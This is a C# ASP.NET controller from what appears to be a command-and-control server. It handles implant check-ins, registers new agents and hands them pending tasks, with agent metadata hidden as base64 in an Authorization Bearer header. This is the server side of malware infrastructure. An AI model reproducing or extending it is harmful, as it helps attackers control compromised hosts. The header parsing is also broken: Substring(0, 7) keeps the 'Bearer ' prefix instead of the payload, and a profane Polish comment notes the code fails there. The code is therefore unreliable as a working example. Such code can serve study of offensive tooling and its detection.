using C2.Server.Models.Agents;
using C2.Server.Services;
using Microsoft.AspNetCore.Mvc;
using Newtonsoft.Json;
using System.Text;

public class HttpListenerController : ControllerBase
{
    private readonly IAgentService _agentService;

    // TU NIE DZIALA KURWA JEBANA
    public HttpListenerController(IAgentService agentService)
    {
        _agentService = agentService;
    }

    public IActionResult HandleImplant()
    {
        AgentMetadata? metadata = ExtractMetadata(HttpContext.Request.Headers);
        if (metadata is null)
        {
            return NotFound();
        }

        Agent? agent = _agentService.GetAgent(metadata.Id);
        if (agent is null)
        {
            agent = new Agent(metadata);
            _agentService.AddAgent(agent);
        }

        IEnumerable<AgentTask> tasks = agent.GetPendingTasks();

        return Ok(tasks);
    }

    private AgentMetadata? ExtractMetadata(IHeaderDictionary headers)
    {
        if (!headers.TryGetValue("Authorization", out var encodedMetadata))
        {
            return null;
        }

        // Authorization: Bearer <base64>
        encodedMetadata = encodedMetadata.ToString().Substring(0, 7);

        String jsonMetadata = Encoding.UTF8.GetString(Convert.FromBase64String(encodedMetadata));

        return JsonConvert.DeserializeObject<AgentMetadata>(jsonMetadata);
    }
}